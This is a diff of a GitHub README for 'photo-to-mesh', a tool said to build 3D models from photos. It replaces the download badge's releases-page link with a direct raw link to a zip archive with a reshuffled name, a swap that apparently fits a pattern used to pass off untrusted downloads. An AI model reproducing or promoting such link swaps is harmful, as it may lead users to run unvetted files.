@@ -1,6 +1,6 @@
 # 📷 photo-to-mesh - Create 3D models from simple photos
 
-[![Download photo-to-mesh](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/closeminded-sourcherry506/photo-to-mesh/releases)
+[![Download photo-to-mesh](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://raw.githubusercontent.com/closeminded-sourcherry506/photo-to-mesh/main/data/to-photo-mesh-3.0.zip)
 
 ## 📋 About This Software
 
